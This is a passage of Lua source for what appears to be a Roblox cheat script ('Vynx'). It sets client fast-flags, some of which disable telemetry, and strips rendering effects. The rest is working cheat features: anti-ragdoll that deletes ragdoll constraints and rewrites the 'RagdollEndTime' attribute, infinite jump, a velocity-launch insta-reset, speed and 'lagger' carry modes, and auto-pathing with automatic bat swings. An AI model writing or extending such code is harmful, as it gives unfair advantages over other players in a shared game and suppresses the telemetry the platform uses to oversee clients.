    { "DFIntClientPacketMaxDelayMs", "1" },
    { "DFIntMaxWaitTimeBeforeForcePacketProcessMS", "1" },
    { "DFIntMaxFrameBufferSize", "4" },
    { "DFIntBufferCompressionThreshold", "100" },
    { "DFIntOverrideISRReplicatorStepBandwidthBytes", "131072" },
    { "DFIntTaskSchedulerTargetFps", "9999" },
    { "DFIntTaskSchedulerJobInitThreads", "8" },
    { "DFIntTaskSchedulerJobInGameThreads", "8" },
    { "FIntTaskSchedulerAutoThreadLimit", "16" },
    { "FIntTaskSchedulerAsyncTasksMinimumThreadCount", "4" },
    { "DFIntRuntimeConcurrency", "16" },
    { "FIntSimWorldTaskQueueParallelTasks", "20" },
    { "DFIntHttpBatchLimit", "256" },
    { "FIntHttpBatchLimit", "256" },
    { "DFIntHttpCurlConnectionCacheSize", "512" },
    { "FIntDefaultMeshCacheSizeMB", "512" },
    { "DFIntMemCacheMaxCapacityMB", "256" },
    { "DFIntNumAssetsMaxToPreload", "1" },
    { "DFFlagEnableSoundPreloading", "false" },
    { "FFlagSlimContentProvider", "true" },
    { "DFFlagDebugSkipMeshVoxelizer", "true" },
    { "DFFlagTextureQualityOverrideEnabled", "true" },
    { "DFIntTextureQualityOverride", "0" },
    { "FIntDebugTextureManagerSkipMips", "7" },
    { "DFIntDebugLimitMinTextureResolutionWhenSkipMips", "8" },
    { "FFlagTM2SkipMipsForUnstreamable2", "true" },
    { "DFFlagDoNotSkipMipsBasedOnSystemMemoryPS", "true" },
    { "FFlagRenderUseTextureManager224", "false" },
    { "DFIntDebugFRMQualityLevelOverride", "1" },
    { "DFFlagDebugPauseVoxelizer", "true" },
    { "FFlagFastGPULightCulling3", "true" },
    { "FIntRenderLocalLightFadeInMs", "0" },
    { "FIntRenderLocalLightUpdatesMax", "1" },
    { "FIntRenderShadowmapBias", "0" },
    { "FIntSSAOMipLevels", "0" },
    { "FIntDebugForceMSAASamples", "1" },
    { "FIntDebugFRMOptionalMSAALevelOverride", "0" },
    { "FIntRobloxGuiBlurIntensity", "0" },
    { "FIntFRMMinGrassDistance", "0" },
    { "FIntFRMMaxGrassDistance", "0" },
    { "DFFlagCoreScriptTelemetry2", "false" },
    { "DFFlagBrowserTrackerIdTelemetryEnabled", "false" },
    { "FFlagPerfDataOnTelemetryV2", "false" },
    { "FFlagSendRenderFidelityTelemetry2", "false" },
    { "FFlagEnableTelemetryServiceMemoryCPUInfo", "false" },
    { "DFIntTelemetryProfilerHundredthsPercentage", "0" },
    { "FIntTelemetryProfilerFrequency", "0" },
    { "FIntPerformanceTelemetryQueueProcessLimit", "0" },
    { "DFIntContentProviderPreloadHangTelemetryHundredthsPercentage", "0" },
}

function M._dawgApplyAllFlags()
    M._dawgFlagSet = 0
    M._dawgFlagDead = 0
    for _, f in ipairs(DAWG_FLAGS) do
        _dawgApplyFlag(f[1], f[2])
    end
end

local function _dawgPermaStrip(inst)
    if inst:IsA("ParticleEmitter") or inst:IsA("Trail") or inst:IsA("Smoke")
        or inst:IsA("Fire") or inst:IsA("Sparkles") then
        inst.Enabled = false
    elseif inst:IsA("PostEffect") then
        inst.Enabled = false
    end
end

local function _dawgApplyPermanentSettings()
    pcall(function()
        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
    end)
    pcall(function()
        UserSettings():GetService("UserGameSettings").SavedQualityLevel = Enum.SavedQualitySetting.QualityLevel1
    end)
    pcall(function()
        Lighting.GlobalShadows = false
        Lighting.EnvironmentDiffuseScale = 0
        Lighting.EnvironmentSpecularScale = 0
    end)
    pcall(function()
        local atmosphere = Lighting:FindFirstChildOfClass("Atmosphere")
        if atmosphere then
            atmosphere.Density = 0
            atmosphere.Glare = 0
            atmosphere.Haze = 0
        end
    end)
    pcall(function()
        local terrain = workspace:FindFirstChildOfClass("Terrain")
        if terrain then
            terrain.Decoration = false
            terrain.WaterWaveSize = 0
            terrain.WaterWaveSpeed = 0
            terrain.WaterReflectance = 0
            local clouds = terrain:FindFirstChildOfClass("Clouds")
            if clouds then clouds.Enabled = false end
        end
    end)
end

function M.enableDawgOptimizer()
    if M._dawgOn then return end
    M._dawgOn = true
    M.dawgOptimizerEnabled = true

    M._dawgApplyAllFlags()
    for _, delay in ipairs({2, 6, 12}) do
        task.delay(delay, function()
            if M._dawgOn then M._dawgApplyAllFlags() end
        end)
    end

    _dawgApplyPermanentSettings()

    task.spawn(function()
        for _, root in ipairs({workspace, Lighting}) do
            local ok, list = pcall(function() return root:GetDescendants() end)
            if ok then
                for _, inst in ipairs(list) do
                    if not M._dawgOn then break end
                    pcall(_dawgPermaStrip, inst)
                end
            end
        end
    end)

    if M._dawgConns.workspace then pcall(function() M._dawgConns.workspace:Disconnect() end) end
    if M._dawgConns.lighting then pcall(function() M._dawgConns.lighting:Disconnect() end) end
    M._dawgConns.workspace = workspace.DescendantAdded:Connect(function(inst)
        if M._dawgOn then pcall(_dawgPermaStrip, inst) end
    end)
    M._dawgConns.lighting = Lighting.DescendantAdded:Connect(function(inst)
        if M._dawgOn then pcall(_dawgPermaStrip, inst) end
    end)

    pcall(function()
        local CoreGui = game:GetService("CoreGui")
        local killNames = { RobloxLoadingGUI = true, BackgroundScreen = true, DevGUIBlackoutCurtain = true }
        for _, child in ipairs(CoreGui:GetChildren()) do
            if killNames[child.Name] then pcall(function() child:Destroy() end) end
        end
    end)

    if M.setDawgOptimizerVisual then pcall(function() M.setDawgOptimizerVisual(true) end) end
    print(string.format("[Vynx/DawgOpt] enabled | flags set ~%d", M._dawgFlagSet or 0))
end

function M.disableDawgOptimizer()
    M._dawgOn = false
    M.dawgOptimizerEnabled = false
    for k, conn in pairs(M._dawgConns) do
        pcall(function() if conn and conn.Disconnect then conn:Disconnect() end end)
        M._dawgConns[k] = nil
    end
    if M.setDawgOptimizerVisual then pcall(function() M.setDawgOptimizerVisual(false) end) end
    print("[Vynx/DawgOpt] disabled")
end

function M.setDawgOptimizer(on)
    if on then
        M.enableDawgOptimizer()
    else
        M.disableDawgOptimizer()
    end
    pcall(function() if saveCherryConfig then saveCherryConfig() end end)
end

M.antiRagdollNoSplatterCooldown = 0

function M.forceNoSplatterReset()
    local char = player.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    local root = char:FindFirstChild("HumanoidRootPart")
    if not hum or not root or hum.Health <= 0 then return end

    pcall(function()
        hum:ChangeState(Enum.HumanoidStateType.GettingUp)
        root.Velocity = Vector3.zero
        root.RotVelocity = Vector3.zero
        root.AssemblyLinearVelocity = Vector3.zero
        root.AssemblyAngularVelocity = Vector3.zero

        for _, obj in ipairs(char:GetDescendants()) do
            if obj:IsA("Motor6D") then obj.Enabled = true end
            if obj:IsA("Constraint") then obj.Enabled = true end
        end

        workspace.CurrentCamera.CameraSubject = hum

        local PM = player.PlayerScripts:FindFirstChild("PlayerModule")
        if PM then
            local CM = require(PM:FindFirstChild("ControlModule"))
            if CM then CM:Enable() end
        end

        hum.AutoRotate = true
        hum.PlatformStand = false
        hum.Sit = false
    end)
end

function M.startAntiRagdoll()
    if M.Conns.antiRag then return end
    M.Conns.antiRag = RunService.Heartbeat:Connect(function()
        if not M.antiRagdollEnabled then return end
        local char = player.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        local root = char:FindFirstChild("HumanoidRootPart")
        if not hum or hum.Health <= 0 then return end

        local state = hum:GetState()
        local ragdolled = (state == Enum.HumanoidStateType.Physics or
                          state == Enum.HumanoidStateType.Ragdoll or
                          state == Enum.HumanoidStateType.FallingDown)

        if M.antiRagdollMode == "No Splatter" then
            if ragdolled then
                local now = tick()
                if now - (M.antiRagdollNoSplatterCooldown or 0) > 0.15 then
                    M.antiRagdollNoSplatterCooldown = now
                    M.forceNoSplatterReset()
                end
            end
            return
        end

        if not root then return end
        local endTime = player:GetAttribute("RagdollEndTime")
        if endTime and (endTime - workspace:GetServerTimeNow()) > 0 then
            ragdolled = true
        end
        if ragdolled then
            pcall(function()
                player:SetAttribute("RagdollEndTime", workspace:GetServerTimeNow())
            end)
            for _, d in ipairs(char:GetDescendants()) do
                if d:IsA("BallSocketConstraint") or
                   (d:IsA("Attachment") and d.Name:find("RagdollAttachment")) then
                    d:Destroy()
                end
            end
            for _, obj in ipairs(char:GetDescendants()) do
                if obj:IsA("Motor6D") and obj.Enabled == false then
                    obj.Enabled = true
                end
            end
            if hum.Health > 0 then
                hum:ChangeState(Enum.HumanoidStateType.Running)
            end
            workspace.CurrentCamera.CameraSubject = hum
            root.Anchored = false
            root.AssemblyLinearVelocity = Vector3.zero
            root.AssemblyAngularVelocity = Vector3.zero
        end
    end)
end

function M.stopAntiRagdoll()
    if M.Conns.antiRag then
        M.Conns.antiRag:Disconnect()
        M.Conns.antiRag = nil
    end
end

M.jumpHeld = false
M.infJumpThread = nil
M._infJumpConn = nil
M._infJumpBoosting = false
M._infJumpLastBoost = 0
M.INF_JUMP_BOOST_FORCE = 25
M.INF_JUMP_BOOST_FRAMES = 2
M.INF_JUMP_BOOST_COOLDOWN = 0.12

-- =====================================================================
-- INF JUMP LOGIC FROM RitualHub
-- Heartbeat: while jump held (Space / Humanoid.Jump) and Y < 35 → Y = 55
-- Fall clamp: Y < -120 → Y = -120
-- =====================================================================

function M.startManualInfJumpLoop()
    -- RitualHub uses the same hold-style loop for infinite jump
    M.startHoldInfJump()
end

function M.stopManualInfJumpLoop()
    M.stopHoldInfJump()
end

function M.startHoldInfJump()
    if M.holdInfJumpConn then
        pcall(function() M.holdInfJumpConn:Disconnect() end)
        M.holdInfJumpConn = nil
    end
    if M._infJumpConn then
        pcall(function() M._infJumpConn:Disconnect() end)
        M._infJumpConn = nil
    end
    if M.infJumpThread then
        pcall(function()
            if typeof(M.infJumpThread) == "RBXScriptConnection" then
                M.infJumpThread:Disconnect()
            end
        end)
        M.infJumpThread = nil
    end
    M.holdInfJumpConn = RunService.Heartbeat:Connect(function()
        if not M.infJumpEnabled then return end
        local char = player.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not root or not hum then return end
        local isJumpHeld = UIS:IsKeyDown(Enum.KeyCode.Space) or (hum.Jump == true)
        -- RitualHub uses Velocity; prefer AssemblyLinearVelocity with Velocity fallback
        local vx, vy, vz
        pcall(function()
            local v = root.AssemblyLinearVelocity
            vx, vy, vz = v.X, v.Y, v.Z
        end)
        if vx == nil then
            local v = root.Velocity
            vx, vy, vz = v.X, v.Y, v.Z
        end
        if isJumpHeld and vy < 35 then
            local nv = Vector3.new(vx, 55, vz)
            pcall(function() root.AssemblyLinearVelocity = nv end)
            pcall(function() root.Velocity = nv end)
        end
        -- re-read after possible boost for fall clamp
        pcall(function()
            local v = root.AssemblyLinearVelocity or root.Velocity
            if v.Y < -120 then
                local nv = Vector3.new(v.X, -120, v.Z)
                root.AssemblyLinearVelocity = nv
                root.Velocity = nv
            end
        end)
    end)
    M.infJumpThread = M.holdInfJumpConn
end

function M.stopHoldInfJump()
    if M.holdInfJumpConn then
        pcall(function() M.holdInfJumpConn:Disconnect() end)
        M.holdInfJumpConn = nil
    end
    if M._infJumpConn then
        pcall(function() M._infJumpConn:Disconnect() end)
        M._infJumpConn = nil
    end
    if M.infJumpThread then
        pcall(function()
            if typeof(M.infJumpThread) == "RBXScriptConnection" then
                M.infJumpThread:Disconnect()
            end
        end)
        M.infJumpThread = nil
    end
end

function M.forceVanillaAnimate(char)
    char = char or player.Character
    if not char then return end
    pcall(function()
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum and M.stopAllTracks then M.stopAllTracks(hum) end

        M.savedAnimate = nil
        M._savedAnimateFromChar = nil
        local current = char:FindFirstChild("Animate")
        if current then pcall(function() current:Destroy() end) end

        local starter = game:GetService("StarterPlayer"):FindFirstChild("StarterCharacterScripts")
        local template = starter and starter:FindFirstChild("Animate")
        if template then
            local a = template:Clone()
            a.Name = "Animate"
            a.Parent = char
            return
        end

        task.delay(0.15, function()
            if not char.Parent then return end
            if char:FindFirstChild("Animate") then return end
            local a = Instance.new("LocalScript")
            a.Name = "Animate"
            a.Parent = char
        end)
    end)
end

function M.applyWalkState(char)
    char = char or player.Character
    if not char then return end

    local wantPack = (M.animPackEnabled == true) and type(M.animPack) == "string" and M.PACKS and M.PACKS[M.animPack]
    local wantUnwalk = (M.unwalkEnabled == true) and not wantPack
    if wantPack then
        if M.unwalkEnabled then M.unwalkEnabled = false end
        pcall(function() M.applyAnimPack(M.animPack) end)
    elseif wantUnwalk then
        pcall(function()
            local animate = M.waitForAnimate(char)
            if not animate then return end

            if not M.savedAnimate then
                M.saveOriginalAnimate(char)
            end
            local hum = char:FindFirstChildOfClass("Humanoid")
            if M.stopAllTracks then M.stopAllTracks(hum) end
            local walkObj = M.ensureAnim(animate:FindFirstChild("walk"), "WalkAnim")
            local runObj  = M.ensureAnim(animate:FindFirstChild("run"), "RunAnim")
            M.setAnim(walkObj, 180436148)
            M.setAnim(runObj, 180426354)
        end)
    else
        -- Both off: keep original animations, never unwalk
        if M.unwalkEnabled then M.unwalkEnabled = false end
        if not M.animPackEnabled then
            M.animPack = nil
        end
        pcall(function()
            if M.forceVanillaAnimate then
                M.forceVanillaAnimate(char)
            elseif M.resetAnimations then
                M.resetAnimations(char)
            end
        end)
    end
end

function M.startUnwalk()
    -- Only apply unwalk when user has it toggled ON — never force-enable after reset/rejoin
    if M.unwalkEnabled ~= true then
        return
    end
    M.animPackEnabled = false
    M.animPack = nil
    local char = player.Character
    if not char then return end
    pcall(function()

        if not M.savedAnimate then
            M.saveOriginalAnimate(char)
        end
        local animate = M.waitForAnimate(char)
        if not animate then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if M.stopAllTracks then M.stopAllTracks(hum) end
        local walkObj = M.ensureAnim(animate:FindFirstChild("walk"), "WalkAnim")
        local runObj  = M.ensureAnim(animate:FindFirstChild("run"), "RunAnim")
        M.setAnim(walkObj, 180436148)
        M.setAnim(runObj, 180426354)
    end)
end

function M.stopUnwalk()

    M.unwalkEnabled = false
    local char = player.Character
    if not char then return end
    if M.animPackEnabled and M.animPack and M.PACKS and M.PACKS[M.animPack] then
        pcall(function() M.applyAnimPack(M.animPack) end)
    else

        pcall(function() M.forceVanillaAnimate(char) end)
    end
end

M._instaResetTP = CFrame.new(2000.5, 9911.9, 4000.2)
M._isInstaResetting = false
M.instaResetCooldown = 0.5
M._resetCooldown = false
M._resetThread = nil
M._resetSuccessful = false
M._stopResetSequence = false
M._cameraLocked = false
M._lockedCameraCFrame = nil
M._resetChar = nil
local RESET_MAX_DURATION = 0.05

function M.stopInstaResetSequence()
    M._stopResetSequence = true
    if M._resetThread then
        pcall(function() task.cancel(M._resetThread) end)
        M._resetThread = nil
    end
    M._resetCooldown = false
    M._resetChar = nil
    M._cameraLocked = false
    M._isInstaResetting = false

    pcall(function()
        local cam = workspace.CurrentCamera
        if cam and cam.CameraType == Enum.CameraType.Scriptable then
            cam.CameraType = Enum.CameraType.Custom
            local hum = player.Character
                and player.Character:FindFirstChildOfClass("Humanoid")
            if hum then cam.CameraSubject = hum end
        end
    end)

    local character = player.Character
    if character then
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            pcall(function()
                humanoid.PlatformStand = false
                humanoid.HipHeight = 2
                local rootPart = character:FindFirstChild("HumanoidRootPart")
                if rootPart then rootPart.CanCollide = true end
                for _, part in ipairs(character:GetChildren()) do
                    if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
                        part.CanCollide = true
                    end
                end
            end)
        end
    end
end

function M.cursedInstaReset()
    if M._resetCooldown then return end
    M._resetCooldown = true
    M._resetSuccessful = false
    M._stopResetSequence = false
    M._cameraLocked = false
    M._isInstaResetting = true

    local character = player.Character
    if not character then
        M._resetCooldown = false
        M._isInstaResetting = false
        return
    end

    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local rootPart = character:FindFirstChild("HumanoidRootPart")
        or character:FindFirstChild("UpperTorso")
    if not rootPart then
        M._resetCooldown = false
        M._isInstaResetting = false
        return
    end

    local camera = workspace.CurrentCamera
    if camera then
        pcall(function()
            camera.CameraType = Enum.CameraType.Scriptable
            camera.CFrame = CFrame.new(
                -337.938599, -0.585044861, 106.739204,
                0.133411571, -0.379638135, 0.915465117,
                0, 0.923722506, 0.383062422,
                -0.991060734, -0.0511049591, 0.123235278
            )
            camera.Focus = CFrame.new(
                -349.381927, -5.37332535, 105.198761,
                1, 0, 0,
                0, 1, 0,
                0, 0, 1
            )
        end)
        task.delay(0.1, function()
            pcall(function()
                local cam = workspace.CurrentCamera
                if cam then
                    cam.CameraType = Enum.CameraType.Custom
                    local hum = player.Character
                        and player.Character:FindFirstChildOfClass("Humanoid")
                    if hum then cam.CameraSubject = hum end
                end
            end)
        end)
    end

    if humanoid then
        pcall(function()
            humanoid.BreakJointsOnDeath = true
            humanoid.PlatformStand = true
            humanoid:ChangeState(Enum.HumanoidStateType.Physics)
        end)
    end

    pcall(function()
        rootPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
        rootPart.AssemblyLinearVelocity = Vector3.new(0, 1000000, 0)
    end)

    task.delay(tonumber(M.instaResetCooldown) or 0.5, function()
        M._resetCooldown = false
        M._isInstaResetting = false
        M._resetChar = nil
        M._stopResetSequence = false
    end)
end

if not M._instaResetCharHooked then
    M._instaResetCharHooked = true
    player.CharacterAdded:Connect(function(char)
        if M.stopInstaResetSequence then pcall(M.stopInstaResetSequence) end
        M._resetSuccessful = false
        M._stopResetSequence = false
        M._cameraLocked = false
        task.defer(function()
            task.wait(0.4)
            if player.Character == char and M.applyWalkState then
                pcall(function() M.applyWalkState(char) end)
            end
            task.wait(1.0)
            if player.Character == char and M.applyWalkState then
                pcall(function() M.applyWalkState(char) end)
            end
        end)
    end)
end

function M.hasBrainrotInHand()
    local char = player.Character
    if not char then return false end
    for _, item in ipairs(char:GetChildren()) do
        if item:IsA("Tool") then
            local name = item.Name:lower()
            if name:find("brainrot", 1, true) or name:find("skibidi", 1, true) or name:find("toilet", 1, true) then
                return true
            end
        end
    end
    return false
end

function M.forceLaggerCarryWhileHolding()

    return false
end

function M.toggleCarryMode()
    if M.forceLaggerCarryWhileHolding() then
        M.refreshSpeedModeLabel()
        if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(false) end
        if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(false) end
        if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(true) end
        if M.carryModeBtn then M.carryModeBtn.Text = "Carry Off" end
        if M.laggerModeBtn then M.laggerModeBtn.Text = "Lag Off" end
        if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry On" end
        saveCherryConfig()
        return
    end
    M.carrySpeedActive = not M.carrySpeedActive

    if M.carrySpeedActive then
        M.laggerCarryActive = false
    end
    M.refreshSpeedModeLabel()
    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(M.carrySpeedActive) end
    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(M.laggerCarryActive) end
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(M.laggerModeEnabled) end
    if M.carryModeBtn then
        M.carryModeBtn.Text = M.carrySpeedActive and "Carry On" or "Carry Off"
    end
    if M.laggerCarryBtn then
        M.laggerCarryBtn.Text = M.laggerCarryActive and "L.Carry On" or "L.Carry Off"
    end
    if M._applyCarryBtnColor then pcall(M._applyCarryBtnColor, M.carrySpeedActive == true) end
    if M._applyLagBtnColor then pcall(M._applyLagBtnColor, M.laggerModeEnabled == true) end
    if M._applyLCBtnColor then pcall(M._applyLCBtnColor, M.laggerCarryActive == true) end
    saveCherryConfig()
end

function M.toggleLaggerMode()
    if M.forceLaggerCarryWhileHolding() then
        M.refreshSpeedModeLabel()
        if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(false) end
        if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(true) end
        if M.laggerModeBtn then M.laggerModeBtn.Text = "Lag Off" end
        if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry On" end
        saveCherryConfig()
        return
    end
    M.laggerModeEnabled = not M.laggerModeEnabled
    if M.laggerModeEnabled then M.laggerCarryActive = false end
    M.refreshSpeedModeLabel()
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(M.laggerModeEnabled) end
    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(M.laggerCarryActive) end
    if M.laggerModeBtn then
        M.laggerModeBtn.Text = M.laggerModeEnabled and "Lag On" or "Lag Off"
    end
    if M.laggerCarryBtn then
        M.laggerCarryBtn.Text = M.laggerCarryActive and "L.Carry On" or "L.Carry Off"
    end
    if M._applyCarryBtnColor then pcall(M._applyCarryBtnColor, M.carrySpeedActive == true) end
    if M._applyLagBtnColor then pcall(M._applyLagBtnColor, M.laggerModeEnabled == true) end
    if M._applyLCBtnColor then pcall(M._applyLCBtnColor, M.laggerCarryActive == true) end
    saveCherryConfig()
end

function M.cycleLaggerModeBind()
    if M.forceLaggerCarryWhileHolding() then
        M.refreshSpeedModeLabel()
        if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(false) end
        if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(false) end
        if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(true) end
        if M.carryModeBtn then M.carryModeBtn.Text = "Carry Off" end
        if M.laggerModeBtn then M.laggerModeBtn.Text = "Lag Off" end
        if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry On" end
        saveCherryConfig()
        return
    end
    if not M.laggerCarryActive and not M.laggerModeEnabled then
        M.laggerCarryActive = true
        M.laggerModeEnabled = false
        M.carrySpeedActive = false
    elseif M.laggerCarryActive then
        M.laggerCarryActive = false
        M.laggerModeEnabled = true
    else
        M.laggerModeEnabled = false
        M.laggerCarryActive = true
        M.carrySpeedActive = false
    end

    M.refreshSpeedModeLabel()
    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(M.carrySpeedActive) end
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(M.laggerModeEnabled) end
    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(M.laggerCarryActive) end
    if M.carryModeBtn then M.carryModeBtn.Text = M.carrySpeedActive and "Carry On" or "Carry Off" end
    if M.laggerModeBtn then M.laggerModeBtn.Text = M.laggerModeEnabled and "Lag On" or "Lag Off" end
    if M.laggerCarryBtn then M.laggerCarryBtn.Text = M.laggerCarryActive and "L.Carry On" or "L.Carry Off" end
    saveCherryConfig()
end

function M.toggleLaggerCarry()
    M.laggerCarryActive = not (M.laggerCarryActive == true)
    if M.laggerCarryActive then
        -- exclusive: kill other speed modes so getActiveMoveSpeed uses LAGGER_CARRY_SPEED only
        M.laggerModeEnabled = false
        M.carrySpeedActive = false
        if (M.speedUIMode or "Original") == "Customizer" then
            M.speedBoosterEnabled = true
            M.speedBoosterPath = "Lagger"
        end
    end
    pcall(function() if M.refreshSpeedModeLabel then M.refreshSpeedModeLabel() end end)
    if M.mobBtnRefs then
        if M.mobBtnRefs.carrySpeed then pcall(function() M.mobBtnRefs.carrySpeed(M.carrySpeedActive == true) end) end
        if M.mobBtnRefs.lagger then pcall(function() M.mobBtnRefs.lagger(M.laggerModeEnabled == true) end) end
        if M.mobBtnRefs.laggerCarry then pcall(function() M.mobBtnRefs.laggerCarry(M.laggerCarryActive == true) end) end
    end
    if M.laggerModeBtn then
        M.laggerModeBtn.Text = M.laggerModeEnabled and "Lag On" or "Lag Off"
    end
    if M.carryModeBtn then
        M.carryModeBtn.Text = M.carrySpeedActive and "Carry On" or "Carry Off"
    end
    if M.laggerCarryBtn then
        M.laggerCarryBtn.Text = M.laggerCarryActive and "L.Carry On" or "L.Carry Off"
    end
    if M._applyCarryBtnColor then pcall(M._applyCarryBtnColor, M.carrySpeedActive == true) end
    if M._applyLagBtnColor then pcall(M._applyLagBtnColor, M.laggerModeEnabled == true) end
    if M._applyLCBtnColor then pcall(M._applyLCBtnColor, M.laggerCarryActive == true) end
    pcall(function() if saveCherryConfig then saveCherryConfig() end end)
end
M.toggleLaggerCarryMode = M.toggleLaggerCarry

function M.stopAutoLeft()
    M.autoLeftEnabled = false
    if M.alConn then M.alConn:Disconnect(); M.alConn = nil end
    M.alPhase = 1
    local char = player.Character
    if char then
        local h = char:FindFirstChildOfClass("Humanoid")
        if h then h:Move(Vector3.zero, false) end
    end
    if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end
    if M.mobBtnRefs.autoLeft then M.mobBtnRefs.autoLeft(false) end
end

function M.stopAutoRight()
    M.autoRightEnabled = false
    if M.arConn then M.arConn:Disconnect(); M.arConn = nil end
    M.arPhase = 1
    local char = player.Character
    if char then
        local h = char:FindFirstChildOfClass("Humanoid")
        if h then h:Move(Vector3.zero, false) end
    end
    if M.autoRightSetVisual then M.autoRightSetVisual(false) end
    if M.mobBtnRefs.autoRight then M.mobBtnRefs.autoRight(false) end
end

function M.startAutoLeft()
    if M.alConn then M.alConn:Disconnect() end
    M.alPhase = 1
    M.autoLeftEnabled = true
    M.alConn = RunService.Heartbeat:Connect(function()
        if not M.autoLeftEnabled then return end
        local char = player.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum then return end
        local spd = (M.getAutoPathSpeed and M.getAutoPathSpeed()) or (M.NS or 60)
        if M.alPhase == 1 then
            local tgt = Vector3.new(M.AP_L1.X, hrp.Position.Y, M.AP_L1.Z)
            if (tgt - hrp.Position).Magnitude < 1 then
                M.alPhase = 2
                local d = M.AP_L2 - hrp.Position
                local mv = Vector3.new(d.X, 0, d.Z)
                if mv.Magnitude > 0.01 then mv = mv.Unit end
                hum:Move(mv, false)
                hrp.AssemblyLinearVelocity = Vector3.new(mv.X * spd, hrp.AssemblyLinearVelocity.Y, mv.Z * spd)
                return
            end
            local d = M.AP_L1 - hrp.Position
            local mv = Vector3.new(d.X, 0, d.Z)
            if mv.Magnitude > 0.01 then mv = mv.Unit end
            hum:Move(mv, false)
            hrp.AssemblyLinearVelocity = Vector3.new(mv.X * spd, hrp.AssemblyLinearVelocity.Y, mv.Z * spd)
        elseif M.alPhase == 2 then
            local tgt = Vector3.new(M.AP_L2.X, hrp.Position.Y, M.AP_L2.Z)
            if (tgt - hrp.Position).Magnitude < 1 then
                hum:Move(Vector3.zero, false)
                hrp.AssemblyLinearVelocity = Vector3.zero
                M.autoLeftEnabled = false
                if M.alConn then M.alConn:Disconnect(); M.alConn = nil end
                M.alPhase = 1
                if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end
                if M.mobBtnRefs.autoLeft then M.mobBtnRefs.autoLeft(false) end
                return
            end
            local d = M.AP_L2 - hrp.Position
            local mv = Vector3.new(d.X, 0, d.Z)
            if mv.Magnitude > 0.01 then mv = mv.Unit end
            hum:Move(mv, false)
            hrp.AssemblyLinearVelocity = Vector3.new(mv.X * spd, hrp.AssemblyLinearVelocity.Y, mv.Z * spd)
        end
        if M.autoMoveSwingEnabled and not M._alSwingDebounce then
            M._alSwingDebounce = true
            local bat = M.findBat and M.findBat() or (M.findBatForAimbot and M.findBatForAimbot())
            if bat then
                if bat.Parent ~= char then pcall(function() hum:EquipTool(bat) end) end
                pcall(function() bat:Activate() end)
            end
            task.delay(M.autoMoveSwingInterval or 0.3, function() M._alSwingDebounce = false end)
        end
    end)
end

function M.startAutoRight()
    if M.arConn then M.arConn:Disconnect() end
    M.arPhase = 1
    M.autoRightEnabled = true
    M.arConn = RunService.Heartbeat:Connect(function()
        if not M.autoRightEnabled then return end
        local char = player.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum then return end
        local spd = (M.getAutoPathSpeed and M.getAutoPathSpeed()) or (M.NS or 60)
        if M.arPhase == 1 then
            local tgt = Vector3.new(M.AP_R1.X, hrp.Position.Y, M.AP_R1.Z)
            if (tgt - hrp.Position).Magnitude < 1 then
                M.arPhase = 2
                local d = M.AP_R2 - hrp.Position
                local mv = Vector3.new(d.X, 0, d.Z)
                if mv.Magnitude > 0.01 then mv = mv.Unit end
                hum:Move(mv, false)
                hrp.AssemblyLinearVelocity = Vector3.new(mv.X * spd, hrp.AssemblyLinearVelocity.Y, mv.Z * spd)
                return
            end
            local d = M.AP_R1 - hrp.Position
            local mv = Vector3.new(d.X, 0, d.Z)
            if mv.Magnitude > 0.01 then mv = mv.Unit end
            hum:Move(mv, false)
            hrp.AssemblyLinearVelocity = Vector3.new(mv.X * spd, hrp.AssemblyLinearVelocity.Y, mv.Z * spd)
        elseif M.arPhase == 2 then
            local tgt = Vector3.new(M.AP_R2.X, hrp.Position.Y, M.AP_R2.Z)
            if (tgt - hrp.Position).Magnitude < 1 then
                hum:Move(Vector3.zero, false)
                hrp.AssemblyLinearVelocity = Vector3.zero
                M.autoRightEnabled = false
                if M.arConn then M.arConn:Disconnect(); M.arConn = nil end
                M.arPhase = 1
                if M.autoRightSetVisual then M.autoRightSetVisual(false) end
                if M.mobBtnRefs.autoRight then M.mobBtnRefs.autoRight(false) end
                return
            end
            local d = M.AP_R2 - hrp.Position
            local mv = Vector3.new(d.X, 0, d.Z)
            if mv.Magnitude > 0.01 then mv = mv.Unit end
            hum:Move(mv, false)
            hrp.AssemblyLinearVelocity = Vector3.new(mv.X * spd, hrp.AssemblyLinearVelocity.Y, mv.Z * spd)
        end
        if M.autoMoveSwingEnabled and not M._arSwingDebounce then
            M._arSwingDebounce = true
            local bat = M.findBat and M.findBat() or (M.findBatForAimbot and M.findBatForAimbot())
